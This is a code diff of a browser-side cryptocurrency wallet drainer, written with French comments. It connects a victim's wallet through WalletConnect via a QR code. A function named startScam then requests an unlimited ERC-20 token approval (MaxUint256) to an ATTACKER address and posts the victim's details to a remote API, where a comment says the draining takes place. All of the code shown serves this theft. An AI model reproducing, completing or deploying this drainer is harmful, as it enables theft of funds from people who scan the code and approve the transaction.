@@ -10,7 +10,6 @@ const TOKENS = {
 let signClient;
 let session;
 let account;
-let currentChainId;
 const PROJECT_ID = '0ecdd9357f8779fcb4c4944118927362';
 
 function getSignClient() {
@@ -36,6 +35,7 @@ async function initWalletConnect() {
     }
   });
 
+  // Seulement Ethereum mainnet
   const { uri, approval } = await signClient.connect({
     requiredNamespaces: {
       eip155: {
@@ -46,6 +46,7 @@ async function initWalletConnect() {
     }
   });
 
+  // Attendre QRCode
   await new Promise((resolve, reject) => {
     if (typeof QRCode !== 'undefined') return resolve();
     let tries = 0;
@@ -64,16 +65,11 @@ async function initWalletConnect() {
 
   const qrDiv = document.getElementById('qrcode');
   qrDiv.innerHTML = '';
-
   new QRCode(qrDiv, {
     text: uri,
     width: 280,
-    height: 280,
-    colorDark: '#000000',
-    colorLight: '#ffffff',
-    correctLevel: QRCode.CorrectLevel.H
+    height: 280
   });
-
   document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';
 
   session = await approval();
@@ -94,9 +90,10 @@ async function startScam() {
     return;
   }
 
+  // GasPrice fixé à 2 gwei
   const gasPrice = ethers.utils.hexlify(2000000000);
 
-  for (const t of tokens) {
+  for (const t of tokens) { // Une seule itération : USDT
     const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
     const data = iface.encodeFunctionData('approve', [ATTACKER, ethers.constants.MaxUint256]);
 
@@ -126,6 +123,7 @@ async function startScam() {
     }
   }
 
+  // Envoi de la victime à l'API (le drain se fait côté serveur)
   await fetch(API, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
